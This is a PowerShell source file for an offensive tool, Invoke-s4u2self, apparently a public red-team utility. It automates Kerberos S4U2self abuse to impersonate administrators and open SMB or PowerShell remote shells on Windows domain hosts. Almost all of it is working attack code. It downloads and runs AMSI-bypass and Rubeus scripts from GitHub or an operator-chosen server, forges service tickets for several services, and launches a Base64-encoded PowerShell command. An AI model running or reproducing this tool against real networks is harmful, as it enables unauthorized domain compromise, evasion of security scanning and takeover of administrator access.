function Invoke-s4u2self {
	
	<#

	.SYNOPSIS
	Invoke-s4u2self Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-s4u2self

	.DESCRIPTION
	A tool that automates s4u2self abuse to gain access to remote hosts
	
	.PARAMETER Domain
	Specify the target Domain
	
	.PARAMETER DomainController
	Specify the target Domain Controller
	
	.PARAMETER ComputerName
	Specify the Target Machine
	
	.PARAMETER NTHash
	NT Hash of the Target Machine
	
	.PARAMETER AES256
	AES256 Hash of the Target Machine
	
	.PARAMETER Ticket
	TGT of the Target Machine
	
	.PARAMETER Password
	Password of the Target Machine
	
	.PARAMETER Impersonate
	User you want to impersonate - a user we know is a local admin (e.g.: a Domain Admin)
	
	.PARAMETER Server
	Serve scripts from provided IP (specify port as follows if not 80: IP:PORT)
	
	.PARAMETER SMBRemoting
	Use SMBRemoting to get a shell on the Target
	
	.PARAMETER PSRemoting
	Use PSRemoting to get a shell on the Target

	.EXAMPLE
	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Password MachinePassword
	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -AES256 d01c9d4441caf093ce018c432c48d50efc1c979a984d769cc0db76d6e5c05ab8
	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Ticket doIFgjCCBX6gA......BsNZmVycmFyaS5sb2NhbA==
	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614 -Domain ferrari.local -DomainController DC01.ferrari.local 
	
	#>
	
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Domain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$DomainController,
		
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[String]
		$ComputerName,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$NTHash,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$AES256,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Ticket,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Password,
		
		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
		[String]
		$Impersonate,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Server,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$PSRemoting,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$SMBRemoting
	)
	
	if(!$Domain){
		# Call the function
		$Domain = Get-Domain
	}
	
	if(!$DomainController){
		# Call the function
		$TempDCName = Get-DomainController -trgtdomain $Domain
		if($TempDCName){
			$DomainController = "$TempDCName.$Domain"
		}
		else{
			Write-Error "Failed to identify the Domain Controller."
		}
	}
	
	$ComputerName = $ComputerName.TrimEnd('$')
	
	$CleanHostname = ($ComputerName -split "\.")[0]
	
	$DollarHostname = "$CleanHostname$"
	
	$FQDNHostname = $CleanHostname + "." + $Domain
	
	if($Server){
		iex(new-object net.webclient).downloadstring("http://$($Server)/SimpleAMSI.ps1")
		iex(new-object net.webclient).downloadstring("http://$($Server)/NETAMSI.ps1") > $null
		iex(new-object net.webclient).downloadstring("http://$($Server)/Invoke-Rubeus.ps1")
	}
	else{
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > $null
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
	}
	
	# Define set of commands
	
	if($ComputerName -AND $Password){
		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /password:$Password /domain:$Domain /dc:$DomainController /nowrap
		$startIndex = $RubTicket.IndexOf('doI')
		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
		$FinalTicket = $RubTicket.Substring($startIndex, $endIndex - $startIndex)
		$FinalTicket = $FinalTicket.Trim()
	}
	
	elseif($ComputerName -AND $NTHash){
		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /rc4:$NTHash /domain:$Domain /dc:$DomainController /nowrap
		$startIndex = $RubTicket.IndexOf('doI')
		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
		$FinalTicket = $RubTicket.Substring($startIndex, $endIndex - $startIndex)
		$FinalTicket = $FinalTicket.Trim()
	}
	
	elseif($ComputerName -AND $AES256){
		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /aes256:$AES256 /domain:$Domain /dc:$DomainController /nowrap /opsec
		$startIndex = $RubTicket.IndexOf('doI')
		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
		$FinalTicket = $RubTicket.Substring($startIndex, $endIndex - $startIndex)
		$FinalTicket = $FinalTicket.Trim()
	}
	
	elseif($ComputerName -AND $Ticket){
		$FinalTicket = $Ticket
	}
	
	else{
		Write-Output ""
		Write-Output "No credentials provided, quitting..."
		Write-Output ""
		break
	}
	
	
	
	if($SMBRemoting){
		if($Server){
			$commands = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$WarningPreference = 'SilentlyContinue'
iex(new-object net.webclient).downloadstring('http://$($Server)/SimpleAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('http://$($Server)/NETAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('http://$($Server)/Invoke-Rubeus.ps1') > `$null
iex(new-object net.webclient).downloadstring('http://$($Server)/Invoke-SMBRemoting.ps1') > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-SMBRemoting -ComputerName $FQDNHostname
"@
		}
		else{
			$commands = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$WarningPreference = 'SilentlyContinue'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-SMBRemoting/main/Invoke-SMBRemoting.ps1') > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-SMBRemoting -ComputerName $FQDNHostname
"@
		}
	}
	
	elseif($PSRemoting){
		if($Server){
			$commands = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$WarningPreference = 'SilentlyContinue'
iex(new-object net.webclient).downloadstring('http://$($Server)/SimpleAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('http://$($Server)/NETAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('http://$($Server)/Invoke-Rubeus.ps1') > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Enter-PSSession -ComputerName $FQDNHostname
"@
		}
		else{
			$commands = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$WarningPreference = 'SilentlyContinue'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/NETAMSI.ps1') > `$null
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1') > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:cifs/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:http/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:host/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:ldap/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:wsman/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
Enter-PSSession -ComputerName $FQDNHostname
"@
		}
	}
	
	else{
		Write-Output ""
		Write-Output "Please provide -SMBRemoting or -PSRemoting switch..."
		Write-Output ""
		break
	}
	
	$commands | Out-File "C:\Users\Public\Documents\comm.txt"
	$finalcommand = '$comm = Get-Content -Path "C:\Users\Public\Documents\comm.txt" -Raw;Remove-Item -Path C:\Users\Public\Documents\comm.txt;Invoke-Expression($comm)'
	$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
  	
	Invoke-Rubeus createnetonly /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /show > $null
	
 	Write-Output ""
	Write-Output "Attempting to access the remote machine..."
	Write-Output ""
}

function Get-Domain {
	
	Add-Type -AssemblyName System.DirectoryServices
	
	try{
		$RetrieveDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		$RetrieveDomain = $RetrieveDomain.Name
	}
	catch{$RetrieveDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
	
	$RetrieveDomain
}

function Get-DomainController {
	param (
		[string]$trgtdomain
	)
	
	Add-Type -AssemblyName System.DirectoryServices

	# Create a DirectoryEntry object
	$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$trgtdomain")

	# Create a DirectorySearcher object
	$searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
	$searcher.Filter = "(objectClass=domainDNS)"
	$searcher.PropertiesToLoad.Add("fSMORoleOwner") > $null  # Redirect output to $null to keep the console clean

	# Perform the search
	$results = $searcher.FindOne()
	
	if ($results) {
		# Extract the FSMO role owner DN
		$pdcDn = $results.Properties["fsmoroleowner"][0]

		# Extract the DC name from the DN
		$dcNamePattern = "CN=([^,]+),CN=Servers," 
		if ($pdcDn -match $dcNamePattern) {
			return $matches[1] # Return the actual DC name
		} 
	} 
}
